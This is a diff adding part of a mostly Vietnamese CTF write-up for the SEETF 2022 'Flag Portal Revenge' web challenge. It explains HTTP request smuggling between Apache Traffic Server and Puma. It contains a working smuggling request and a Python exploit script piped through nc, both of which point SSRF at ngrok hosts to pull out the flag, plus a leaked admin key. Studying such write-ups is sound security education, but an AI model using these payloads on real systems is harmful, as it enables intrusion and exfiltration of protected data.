@@ -321,11 +321,121 @@ Ta cho thêm header `admin-key` + `Content-Type: application/x-www-form-urlencod
 
 ## Flag 1
 
-CVE HTTP request smuggling
+Bài Flag Portal 1 nhưng là revenge đã fix lỗi unintended
 
+CVE HTTP request smuggling ở `apache trafficserver 9.0.0` + `Puma 5.6.2`
+
+Flag 1 nằm ở server ruby, code vẫn như cũ ngoài `remap.config`:
+```
+map /api/flag-plz   http://backend/forbidden
+map /api/flag-count http://backend/flag-count
+map /admin          http://flagportal/forbidden
+map /home           http://flagportal/home
+```
+
+HTTP Request Smugglling thường tồn tại giữa `reverse proxy`và `server`, và ở đây để lấy flag 1 là giữa reverse proxy trafficserver(ATS) với Puma(Ruby server). Điều kiện tồn tại lỗ hổng này là khi:
+
+1. ATS xem "chunked" là chunked
+2. Puma bỏ qua giá trị `TE` không hợp lệ/hỗ trợ
+
+Để lấy flag ta cần smuggle đến `/admin` từ đó có thể SSRF:
+
+`BurpSuite`:
+```
+GET /home HTTP/1.1
+Host: example.com
+Transfer-Encoding: "chunked"
+
+DELETE /admin?backend=http://0.tcp.ap.ngrok.io:17572 HTTP/1.1
+Host: revenge.chall.seetf.sg:10020
+Padding: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0: x
+```
+Here's how this works.
+
+**For ATS**:
+
+1. ATS interprets "chunked" as chunked.
+2. It sees the first two characters of DELETE, and interprets 0xDE as the chunk size.
+3. Using the padding header, we add enough bytes so that we have 0xDE bytes when we reach 0: x.
+4. The 0: x line is parsed as the chunk terminator.
+5. ATS only sees one request, GET /.
+
+**For Puma**:
+
+1. Puma ignores the invalid "chunked" transfer encoding.
+2. The content length of the first request is then 0.
+3. Puma sees two requests, GET / and DELETE /admin.
+
+Phân tích payload: 
+
+1. Sau DE tức LETE /admin?backend=....... sẽ bị ignore bởi http load `0xDE` là độ dài data
+2. Thêm header host + padding để pad cho đủ 222 bytes bởi:
+
+![Screenshot 2022-06-08 180121](https://user-images.githubusercontent.com/71699412/172636605-2bf95181-ed9f-42ed-9e6a-275ef10dc003.jpg)
+
+3. Request Smuggling `CRLF` đàng hoàng, mỗi gói http end bởi 2 ký tự `CRLF` đó
+
+![Screenshot (909)](https://user-images.githubusercontent.com/71699412/172636840-9438d462-2a00-40b1-9371-8968ad29cced.png)
+
+Gửi payload:
+
+![Screenshot (910)](https://user-images.githubusercontent.com/71699412/172636893-dd8ba848-d613-4083-81d0-f0defecbda60.png)
+
+Nhận:
+
+![Screenshot (908)](https://user-images.githubusercontent.com/71699412/172636911-bea34604-c02b-44c7-b945-28d09f8e9558.png)
+
+**flag**: `SEE{h0p3fully_1_h4v3_f1x3d_th3_un1nt3nd3d_s0lut10ns_e0ccd5b53a82ca67cd060dceb01636b3}`
+
+Ngoài ra: `Admin-Key: unchain-outskirts-scalping`
 ## Flag 2
 
-pass
+pass, kèo hơi khó, đọc kĩ hơn ở: https://github.com/zeyu2001/My-CTF-Challenges/blob/main/SEETF-2022/web/flagportal-revenge/solve.md
+
+```python
+import sys
+
+form_body = b"target=http://ecd7-42-61-184-100.ngrok.io"
+
+smuggled = (
+    b"POST /flag-plz HTTP/1.1\r\n" +
+    b"Host: backend\r\n" +
+    b"ADMIN-KEY: unchain-outskirts-scalping\r\n" + 
+    b'Content-Type: application/x-www-form-urlencoded\r\n' +
+    b"Content-Length: " + str(len(form_body)).encode() + b"\r\n" +
+    b"\r\n" +
+    form_body + b"\r\n"
+    b"\r\n" +
+    b"0\r\n" +
+    b"\r\n"
+)
+
+def h(n):
+    return hex(n)[2:].encode()
+
+smuggled_len = h(len(smuggled) - 2)
+
+first_chunk_len = h(len(smuggled_len))
+
+sys.stdout.buffer.write(
+    b"GET /api/flag-count HTTP/1.1\r\n" +
+    b"Host: backend\r\n" +
+    b"Transfer-Encoding: chunked\r\n" +
+    b"\r\n" +
+    first_chunk_len + b";\n" + b"x"*len(smuggled_len) + b"\r\n" +
+    smuggled_len + b"\r\n" +
+    b"0\r\n" +
+    b"\r\n" +
+    smuggled
+)
+```
+
+```bash
+python3 exploit.py | nc revenge.chall.seetf.sg 10020
+```
+
+Cách chunk gói data, nó có thể gói nhiều gói x, y bytes khác nhau, terminate bởi `0\r\n\r\n`: https://en.wikipedia.org/wiki/Chunked_transfer_encoding#:~:text=Chunked%20transfer%20encoding%20is%20a,received%20independently%20of%20one%20another.
 
 ## Username Generator
 
